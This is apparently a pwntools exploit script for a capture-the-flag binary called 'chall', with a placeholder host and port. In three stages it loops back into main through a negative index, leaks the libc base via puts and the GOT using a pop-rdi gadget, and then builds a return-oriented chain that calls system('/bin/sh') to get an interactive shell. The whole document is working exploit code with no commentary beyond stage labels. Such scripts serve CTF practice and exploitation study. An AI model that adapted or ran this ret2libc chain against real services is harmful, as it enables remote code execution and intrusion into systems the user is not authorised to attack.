# -- coding: utf-8 --
from pwn import *

# ENV
PORT = 0000
HOST = "host"
e = context.binary = ELF('./chall')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()
pause()

# VARIABLE
rdi = 0x4012b3

# PAYLOAD
## STAGE 1 - setup a loop, write main+1 on the stack for stage2
payload  = ''
payload += p64(e.sym.main+1)

r.sendafter('name?', "1"*24)
r.sendafter('number?', '-72aaaaa' + p64(e.sym.main+1) + p64(e.sym.main)[:3])

## STAGE 2 - leak libc base
payload  = ''
payload += p64(rdi)
payload += p64(e.got.puts)
payload += p64(e.sym.puts)

r.sendafter("name", payload)
r.sendlineafter("number", "-40")
leak = r.recvline().strip()[2:]
leak = u64(leak.ljust(8, '\0'))
info("puts_plt: 0x%x" % leak)
lib.address = leak - lib.sym.puts

## STAGE 3 - ROP to get shell
payload  = ''
payload += p64(rdi)
payload += p64(next(lib.search("/bin/sh\x00")))
payload += p64(lib.sym.system)

r.sendafter("name", payload)
r.sendafter("number", "-40")

r.interactive()